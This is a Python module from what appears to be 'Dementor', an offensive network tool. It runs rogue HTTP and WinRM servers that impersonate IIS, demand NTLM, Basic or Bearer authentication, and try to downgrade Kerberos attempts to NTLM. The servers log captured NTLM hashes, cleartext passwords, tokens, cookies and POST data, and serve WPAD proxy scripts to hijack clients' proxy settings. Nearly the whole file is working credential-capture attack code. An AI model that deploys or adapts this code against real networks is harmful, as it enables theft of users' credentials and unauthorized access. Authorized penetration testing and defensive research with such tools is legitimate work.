# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import socket
import base64
import pathlib
import ssl

from http import HTTPStatus
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

from jinja2.environment import Environment, Template
from jinja2.loaders import FileSystemLoader
from jinja2.exceptions import TemplateNotFound
from jinja2 import select_autoescape

from rich import markup
from impacket import ntlm

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.util import format_string, get_value, is_true
from dementor.logger import ProtocolLogger, dm_logger
from dementor.servers import ServerThread, bind_server
from dementor.database import _CLEARTEXT, normalize_client_address, _NO_USER
from dementor.paths import HTTP_TEMPLATES_PATH
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_ESS,
    NTLM_report_auth,
    NTLM_split_fqdn,
)


def apply_config(session):
    session.proxy_config = ProxyAutoConfig(get_value("Proxy", key=None, default={}))

    servers = []
    for server_config in get_value("HTTP", "Server", default=[]):
        servers.append(HTTPServerConfig(server_config))
    session.http_config = servers

    winrm_config = []
    config = HTTPServerConfig({"Port": 5985})
    config.http_wpad_enabled = False
    config.http_webdav_enabled = False

    ssl_enabled = bool(config.http_cert)
    config.http_cert = None
    config.http_cert_key = None
    winrm_config.append(config)
    if ssl_enabled:
        ssl_config = HTTPServerConfig({"Port": 5986})
        ssl_config.http_wpad_enabled = False
        ssl_config.http_webdav_enabled = False
        ssl_config.http_use_ssl = True
        winrm_config.append(ssl_config)

    if session.winrm_enabled:
        session.winrm_config = winrm_config


def create_server_threads(session):
    servers = []
    for server_config in session.http_config if session.http_enabled else []:
        address = (
            session.bind_address,
            server_config.http_port,
        )
        servers.append(
            ServerThread(
                session,
                HTTPServer,
                server_config,
                server_address=address,
                ipv6=bool(session.ipv6),
            )
        )

    if session.winrm_enabled:
        for winrm_config in session.winrm_config:
            servers.append(
                ServerThread(
                    session,
                    HTTPServer,
                    winrm_config,
                    RequestHandlerClass=WinRMHandler,
                    server_address=(session.bind_address, winrm_config.http_port),
                    ipv6=bool(session.ipv6),
                )
            )

    return servers


class ProxyAutoConfig(TomlConfig):
    _section_ = "Proxy"
    _fields_ = [
        A("proxy_script", "Script", None),
    ]

    def set_proxy_script(self, script):
        self.proxy_script = None
        match script:
            case str():
                path = pathlib.Path(script)
                if not path.exists() or not path.is_file():
                    self.proxy_script = script
                else:
                    self.proxy_script = path.read_text()

            # Dictionary: WPADScript = { file = "..." }
            case dict():
                if "file" not in script:
                    dm_logger.error(
                        f"WPAD script {script} does not specify a file - ignoring..."
                    )
                    return

                path = pathlib.Path(script["file"])
                if not path.exists() or not path.is_file():
                    dm_logger.error(
                        f"WPAD script at {path} does not exist - ignoring..."
                    )
                    return

                if not path.is_file():
                    dm_logger.error(
                        f"WPAD script at {path} is not a file - ignoring..."
                    )
                    return

                self.proxy_script = path.read_text()

            case None:
                pass

            case _:
                dm_logger.error(
                    f"WPAD script {script} is not a string or dictionary - ignoring..."
                )


class HTTPServerConfig(TomlConfig):
    _section_ = "HTTP"
    _fields_ = [
        A("http_port", "Port"),
        A("http_server_type", "ServerType", "Microsoft-IIS/10.0", factory=format_string), #noqa
        A("http_auth_schemes", "AuthSchemes", ["Negotiate", "NTLM", "Basic", "Bearer"]),
        A("http_fqdn", "FQDN", "DEMENTOR", section_local=False, factory=format_string),
        A("http_extra_headers", "ExtraHeaders", list),
        A("http_wpad_enabled", "WPAD", True, factory=is_true),
        A("http_wpad_auth", "WPADAuthRequired", True, factory=is_true),
        A("http_templates", "TemplatesPath", [HTTP_TEMPLATES_PATH]),
        A("http_webdav_enabled", "WebDAV", True, factory=is_true),
        A("http_methods", "Methods", ["GET", "POST"]),
        A("http_cert", "Cert", None, section_local=False),
        A("http_cert_key", "Key", None, section_local=False),
        A("http_use_ssl", "TLS", False, factory=is_true),
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_ESS,
    ]

    def set_http_ntlm_challenge(self, challenge):
        if isinstance(challenge, bytes):
            self.http_ntlm_challenge = challenge
        else:
            self.http_ntlm_challenge = str(challenge).encode(errors="replace")

    def set_http_templates(self, templates_dirs: list):
        dirs = []
        for templates_dir in templates_dirs:
            path = pathlib.Path(templates_dir)
            if not path.exists() or not path.is_dir():
                dm_logger.error(
                    f"HTTP templates directory {path} does not exist - using default..."
                )
                path = HTTP_TEMPLATES_PATH

            dirs.append(str(path))

        if HTTP_TEMPLATES_PATH not in dirs:
            dirs.append(HTTP_TEMPLATES_PATH)

        self.http_templates = dirs


class HTTPHeaders:
    WWW_AUTHENTICATE = "WWW-Authenticate"
    AUTHORIZATION = "Authorization"


class HTTPHandler(BaseHTTPRequestHandler):
    def __init__(self, session, config, request, client_address, server) -> None:
        self.config = config  # REVISIT: this is confusing
        self.session = session
        self.client_address = client_address
        self.challenge = None
        self.setup_proto_logger()
        for http_method in config.http_methods:
            if http_method in ("OPTIONS", "PROPFIND"):
                # reserved options
                continue

            setattr(self, f"do_{http_method}", lambda: self.handle_request(self.logger))

        super().__init__(request, client_address, server)

    def setup_proto_logger(self):
        self.logger = ProtocolLogger(
            extra={
                "protocol": "HTTP",
                "protocol_color": "chartreuse3",
                "host": normalize_client_address(self.client_address[0]),
                "port": self.config.http_port,
            }
        )
        self.webdav_logger = ProtocolLogger(
            extra={
                "protocol": "WebDAV",
                "protocol_color": "sea_green3",
                "host": normalize_client_address(self.client_address[0]),
                "port": self.config.http_port,
            }
        )

    def do_PROPFIND(self):
        if self.config.http_webdav_enabled:
            self.handle_request(self.webdav_logger)
        else:
            self.send_error(HTTPStatus.NOT_FOUND, "Not Found")

    def do_OPTIONS(self):
        # always support everything
        self.send_response(HTTPStatus.OK)
        self.send_header("Allow", "OPTIONS,GET,HEAD,POST,TRACE,PROPFIND")
        self.end_headers()

    def do_HEAD(self):
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def version_string(self) -> str:
        return self.config.http_server_type

    def log_message(self, format: str, *args) -> None:
        # let us log mssages
        text = format % args
        msg = text.translate(self._control_char_table)
        self.logger.debug(msg)

    def send_response(self, code: int, message: str | None = None) -> None:
        if not hasattr(self, "_headers_buffer"):
            self._headers_buffer = []

        super().send_response(code, message)
        for header in self.config.http_extra_headers:
            self._headers_buffer.append(f"{header}\r\n".encode("latin-1", "strict"))

    def send_error(
        self,
        code: int,
        message: str | None = None,
        explain: str | None = None,
        headers=None,
    ) -> None:
        short, longmsg = self.responses.get(code, ("", ""))
        if not message:
            message = short
        if not explain:
            explain = longmsg

        self.send_response(code, message)
        self.send_header("Connection", "close")
        for header, value in headers or []:
            self.send_header(header, value)

        body = None
        if code >= 200 and code not in (
            HTTPStatus.NO_CONTENT,
            HTTPStatus.RESET_CONTENT,
            HTTPStatus.NOT_MODIFIED,
        ):
            content = self.server.render_error(code, message, explain)
            body = content.encode("utf-8", "replace")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Content-Type", "text/html")

        self.end_headers()
        if body:
            self.wfile.write(body)

    def is_wpad_request(self):
        path = pathlib.Path(self.path)
        return path.suffix == ".pac" or path.stem == "wpad"

    def display_request(self, req_type: str | None = None, logger=None):
        line = f"{self.command} request for {markup.escape(self.path)}"
        if req_type:
            line = f"{line} ({req_type})"
        (logger or self.logger).display(line)

    def send_wpad_script(self):
        if self.config.proxy_config.proxy_script:
            # try to render the custom script
            template = Template(self.config.proxy_config.proxy_script, autoescape=True)
            script = template.render(
                server=self.config,
                session=self.session,
            )
        else:
            script = self.server.render_page("wpad.dat")
            if self.config.http_wpad_enabled and not script:
                self.logger.error("WPAD enabled but script not configured")
                return self.send_error(HTTPStatus.NOT_FOUND)

        self.logger.success("Serving WPAD script to client")
        body = script.encode("latin-1", "strict")

        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def handle_request(self, logger):
        if HTTPHeaders.AUTHORIZATION not in self.headers:
            # make sure the client authenticates to us
            if (
                self.config.http_wpad_enabled
                and self.is_wpad_request()
                and not self.config.http_wpad_auth
            ):
                return self.send_wpad_script()

            self.display_request("Unauthorized", logger)
            self.send_error(
                HTTPStatus.UNAUTHORIZED,
                "Unauthorized",
                headers=[
                    (HTTPHeaders.WWW_AUTHENTICATE, scheme)
                    for scheme in self.config.http_auth_schemes
                ],
            )
        else:
            name, token = self.headers[HTTPHeaders.AUTHORIZATION].split(" ", 1)
            method = getattr(self, f"auth_{name.lower()}", None)
            if method:
                method(token, logger)
            else:
                logger.debug(f"Unknown authentication scheme: {name}")
                self.send_error(HTTPStatus.NOT_FOUND, "Not Found")

    def auth_negotiate(self, token, logger):
        # try to decode negotiate token
        if token.startswith("YII"):
            # possible kerberos authentication attempt, try to downgrade
            return self.send_error(HTTPStatus.UNAUTHORIZED, "Unauthorized")

        self.auth_ntlm(token, logger, scheme="Negotiate")

    def auth_ntlm(self, token, logger, scheme=None):
        try:
            message = ntlm.NTLM_HTTP.get_instance(f"NTLM {token}")
        except Exception:
            # invalid value
            logger.error(f"Invalid negotiate authentication: {token}")
            self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Server Error")
            return

        match message:
            case ntlm.NTLM_HTTP_AuthNegotiate():
                self.display_request("NTLMSSP_NEGOTIATE", logger)
                challenge = NTLM_AUTH_CreateChallenge(
                    message,
                    *NTLM_split_fqdn(self.config.http_fqdn),
                    challenge=self.config.ntlm_challenge,
                    disable_ess=not self.config.ntlm_ess,
                )
                self.send_response(HTTPStatus.UNAUTHORIZED, "Unauthorized")
                data = base64.b64encode(challenge.getData()).decode()
                self.send_header(
                    HTTPHeaders.WWW_AUTHENTICATE, f"{scheme or 'NTLM'} {data}"
                )
                self.end_headers()

            case ntlm.NTLM_HTTP_AuthChallengeResponse():
                self.display_request("NTLMSSP_AUTH", logger)
                NTLM_report_auth(
                    message,
                    challenge=self.config.ntlm_challenge,
                    client=self.client_address,
                    session=self.session,
                    logger=logger,
                    extras=self.get_extras(),
                )
                self.finish_request(logger)

            case _:
                logger.error(f"Invalid negotiate authentication: {token}")
                self.send_error(
                    HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Server Error"
                )

    def auth_bearer(self, token, logger):
        self.display_request("Bearer", logger)
        self.session.db.add_auth(
            client=self.client_address,
            credtype="BearerToken",
            username=_NO_USER,
            password=token.encode().hex(),
            logger=logger,
            extras=self.get_extras(),
            custom=True,
        )
        self.finish_request(logger)

    def auth_basic(self, token, logger):
        self.display_request("Basic", logger)
        try:
            username, password = base64.b64decode(token).decode().split(":", 1)
        except ValueError:
            logger.error(f"Invalid basic authentication: {token}")
            self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Server Error")
            return

        self.session.db.add_auth(
            client=self.client_address,
            credtype=_CLEARTEXT,
            password=password,
            logger=logger,
            username=username,
            extras=self.get_extras(),
        )
        self.finish_request(logger)

    def finish_request(self, logger):
        # inspect the path first, WPAD Auth and custom files are handled separately
        if self.is_wpad_request() and self.config.http_wpad_enabled:
            return self.send_wpad_script()

        self.send_error(418, "I'm a teapot")

    def get_extras(self):
        extras = {}
        if "User-Agent" in self.headers:
            extras["User-Agent"] = self.headers["User-Agent"]

        if "Cookie" in self.headers:
            extras["Cookie"] = self.headers["Cookie"]

        if self.command == "POST":
            length = int(self.headers["Content-Length"])
            if length > 0:
                extras["Data"] = f"(hex) {self.rfile.read(length).hex()}"

        return extras


class WinRMHandler(HTTPHandler):
    def setup_proto_logger(self):
        self.logger = ProtocolLogger(
            extra={
                "protocol": "WinRM",
                "protocol_color": "spring_green1",
                "host": normalize_client_address(self.client_address[0]),
                "port": self.config.http_port,
            }
        )


class HTTPServer(ThreadingHTTPServer):
    service_name = "HTTP"

    def __init__(
        self,
        session,
        server_config,
        server_address=None,
        RequestHandlerClass=None,
        ipv6=False,
    ) -> None:
        self.config = session
        self.server_config = server_config
        self.is_ipv6 = ipv6
        if self.is_ipv6:
            self.address_family = socket.AF_INET6

        self.env = Environment(
            loader=FileSystemLoader(self.server_config.http_templates),
            autoescape=select_autoescape(default=True),
        )

        super().__init__(
            server_address or (self.config.bind_address, 80),
            RequestHandlerClass or HTTPHandler,
        )
        if self.server_config.http_use_ssl:
            # if defined use ssl
            cert_path = pathlib.Path(str(self.server_config.http_cert))
            key_path = pathlib.Path(str(self.server_config.http_cert_key))
            if not cert_path.exists() or not key_path.exists():
                dm_logger.error(
                    f"({self.service_name}, {self.server_address[:2]}) Certificate or key file not found: "
                    f"Cert={self.server_config.http_cert} "
                    f"Key={self.server_config.http_cert_key}"
                )
                return
            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)

    def server_bind(self):
        bind_server(self, self.config)
        ThreadingHTTPServer.server_bind(self)

    def finish_request(self, request, client_address) -> None:
        self.RequestHandlerClass(
            self.config, self.server_config, request, client_address, self
        )

    def render_error(
        self, code: int, message: str | None = None, explain: str | None = None
    ) -> str | None:
        return self.render_page(
            "error_page.html",
            error_code=code,
            error_title=message,
            error_description=explain,
        )

    def render_page(self, template, **kwargs) -> str | None:
        try:
            return self.env.get_template(template).render(
                **kwargs,
                session=self.config,
                server=self.server_config,
            )
        except TemplateNotFound as e:
            dm_logger.error("Error rendering page: Could not find template")
            return


class WinRMServer(HTTPServer):
    service_name = "WinRM"
